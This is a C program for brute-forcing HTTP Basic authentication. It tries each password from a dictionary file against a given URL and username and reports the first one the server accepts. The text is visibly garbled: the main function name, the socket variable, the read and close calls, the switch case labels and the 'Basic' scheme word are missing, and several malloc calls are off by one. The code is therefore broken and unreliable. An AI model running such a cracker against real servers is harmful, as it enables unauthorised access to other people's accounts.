


#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <netdb.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <arpa/inet.h>
#include <errno.h>

#define BUFFER_SIZE 2000
#define RETURN_OK 0
#define RETURN_ERROR 1
#define TRUE  1
#define FALSE 0
#define PASSWORD_LENGTH 3

#define STATUS_OK            200
#define STATUS_AUTH_REQUIRED 401

#define PASSWORD_BAD 0
#define PASSWORD_OK  1
#define CONN_CLOSED  2

void processArguments(int, char **argv, char **, char **, char **);
void printUsage(char *);
void splitURL(const char *, char **, char **);
int initialiseConnection(struct sockaddr_in *, char *);
int openConnection(struct sockaddr_in *);
void sendRequest(int, char *, char *, char *, char *);
int getResponseStatus(int);
void base64_encode(const unsigned char *, unsigned char *);
void getHostErrorMsg(char *);
int testPassword(int, char *, char *, char *, char *);




int (int argc, char *argv[])
{
    char password[BUFFER_SIZE];
    char *dictionaryfile;
    FILE *fp;
    int attempt;
    int ret;

    char *host;
    char *filename;
    char *url;
    char *username;
    struct sockaddr_in serverAddr;
    int ;


    

    processArguments(argc, argv, &url, &username, &dictionaryfile);
    splitURL(url, &host, &filename);

    if (initialiseConnection(&serverAddr, host) == RETURN_ERROR)
        exit(RETURN_ERROR);

     = openConnection(&serverAddr);

    fp = fopen(dictionaryfile, "r");
    if (fp == NULL)
    {
        fprintf(stderr, "Cannot open %s\n", dictionaryfile);
        exit(RETURN_ERROR);
    }

    attempt = 0;

    while (TRUE)
    {
        

        attempt++;
        ret = fscanf(fp, "%s", password);
        if (ret == EOF)
            break;

        ret = testPassword(, host, filename, username, password);
        if (ret == PASSWORD_OK)
        {
            printf("Password found after %d attempts: %s", 
            attempt, password);
            exit(RETURN_OK);
        }
        else if (ret == CONN_CLOSED)
        {
            

            ();
             = openConnection(&serverAddr);
            ret = testPassword(, host, filename, username, password);
            if (ret == PASSWORD_OK)
            {
                printf("Password found after %d attempts: %s", 
                attempt, password);
                exit(RETURN_OK);
            }
        }
    }


    printf("The password has not been cracked\n");
    exit(RETURN_OK);

}





int testPassword(int , char *host, char *filename, 
                 char *username, char *password)
{
    int status;

    sendRequest(, host, filename, username, password);
    status = getResponseStatus();

    if (status == STATUS_OK)
        return PASSWORD_OK;
    else if (status == CONN_CLOSED)
        return CONN_CLOSED;
    else if (status != STATUS_AUTH_REQUIRED)
        fprintf(stderr, "Status %d received from server\n", status);

    return PASSWORD_BAD;
}




void processArguments(int argc, char *argv[], char **url, char **username, 
                      char **dictionary)
{
    if (argc != 4)
    {
        printUsage(argv[0]);
        exit(1);
    }

    *url = (char *) malloc(strlen(argv[1] + 1));
    strcpy(*url, argv[1]);

    *username = (char *) malloc(strlen(argv[2] + 1));
    strcpy(*username, argv[2]);

    *dictionary = (char *) malloc(strlen(argv[3] + 1));
    strcpy(*dictionary, argv[3]);

}






void printUsage(char *program)
{
    fprintf(stderr, "Usage:\n");
    fprintf(stderr, "%s url username dictionaryfile\n", program);
}





void splitURL(const char *url, char **host, char **file)
{
    char *p1; 
    char *p2;

    
    p1 = strstr(url, "//");
    if (p1 == NULL)
        p1 = (char *) url;
    else
        p1 = p1 + 2;

    
    p2 = strstr(p1, "/");
    if (p2 == NULL)
    {
        fprintf(stderr, "Invalid url\n");
        exit(RETURN_ERROR);
    }

    *host = (char *) malloc(p2-p1+2);
    strncpy(*host, p1, p2-p1);
    (*host)[p2-p1] = '\0';

    *file = (char *) malloc(strlen(p2+1));
    strcpy(*file, p2);

}





void sendRequest(int , char *host, char *filename, char *username, 
                 char *password)
{
    char message[BUFFER_SIZE];
    unsigned char encoded[BUFFER_SIZE];
    unsigned char token[BUFFER_SIZE];

    

    
    sprintf((char *) token, "%s:%s", username, password);
    base64_encode(token, encoded);

    sprintf(message, "GET %s HTTP/1.1\nHost: %s\nAuthorization:  %s\n\n",
            filename, host, encoded);

    if (write(, message, strlen(message)) == -1)
    {
        perror("");
        exit(RETURN_ERROR);
    }

}




int getResponseStatus()
{
    char message[BUFFER_SIZE];
    char headercheck[5];
    int  bytesRead;
    char *p1;
    char status_str[4];
    int  status;

    

    bytesRead = (, message, BUFFER_SIZE-1);
    message[bytesRead] = '\0';

    

    strncpy(headercheck, message, 4);
    headercheck[4] = '\0';
    if (strcmp(headercheck, "HTTP") != 0)
    {
        bytesRead = (, message, BUFFER_SIZE);
    }

    if (bytesRead == -1)
    {
        perror("");
        exit(RETURN_ERROR);
    }
    else if (bytesRead == 0)
    {
        
        return CONN_CLOSED;
    }

    
    p1 = strstr(message, " ");
    if (p1 == NULL)
    {
        printf("Status  not found in response\n");
        exit(RETURN_ERROR);
    }
    p1++;

    strncpy(status_str, p1, 3);
    status_str[3] = '\0';
    status = atol(status_str);

    return status;
}




int initialiseConnection(struct sockaddr_in *serverAddr, char *host)
{
    unsigned  serverIP;
    struct hostent *serverHostent;
    char errorMsg[100]; 


    memset(serverAddr, 0, sizeof(*serverAddr));
    serverAddr->sin_port = htons(80);

    

    if ((serverIP = inet_addr(host)) != -1)
    {
        serverAddr->sin_family = AF_INET;
        serverAddr->sin_addr.s_addr = serverIP;
    }
    else if ((serverHostent = gethostbyname(host)) != NULL)
    {
	serverAddr->sin_family = serverHostent->h_addrtype;
        memcpy((void *) &serverAddr->sin_addr,
		 (void *) serverHostent->h_addr, serverHostent->h_length);
    }
    else
    {
       getHostErrorMsg(errorMsg);
       printf("%s: %s\n", host, errorMsg);
       return RETURN_ERROR;
    }

    return RETURN_OK;
}






int openConnection(struct sockaddr_in *serverAddr)
{
    int ;


    if (( = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        perror("");
        exit(RETURN_ERROR);
    }


    

    if (connect(, (struct sockaddr *) serverAddr, sizeof(*serverAddr)) == -1)
    {
        perror("");
        exit(RETURN_ERROR);
    }

    return ;
}




 
void base64_encode(const unsigned char *input, unsigned char *output)
{
    static const char *codes = 
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    int i;
    int len;
    int lenfull;
    unsigned char *p;
    int a;
    int b;
    int c;
    
    p = output;
    len = strlen((char *) input);

    

    lenfull = 3*(len / 3);
    for (i = 0; i < lenfull; i += 3) 
    {
        *p++ = codes[input[0] >> 2];
        *p++ = codes[((input[0] & 3) << 4) + (input[1] >> 4)];
        *p++ = codes[((input[1] & 0xf) << 2) + (input[2] >> 6)];
        *p++ = codes[input[2] & 0x3f];
        input += 3;
    }


    

    if (i < len)
    {
        a = input[0];
        b = (i+1 < len) ? input[1] : 0;
        c = 0;

        *p++ = codes[a >> 2];
        *p++ = codes[((a & 3) << 4) + (b >> 4)];
        *p++ = (i+1 < len) ? codes[((b & 0xf) << 2) + (c >> 6)] : '=';
        *p++ = '=';
    }

    
    *p = '\0';
 
}





void getHostErrorMsg(char *message)
{
    switch (h_errno)
    {
         HOST_NOT_FOUND :
             strcpy(message, "The specified host is unknown");
             break;

         NO_DATA:
             strcpy(message, "The specified host name is valid, but does not have   address");
             break;

         NO_RECOVERY:
             strcpy(message, "A non-recoverable name server error occurred");
             break;

         TRY_AGAIN:
             strcpy(message, "A temporary error occurred   authoritative name server. Try again later.");
             break;

        default:
             strcpy(message, " unknown name server error occurred.");
    }
}

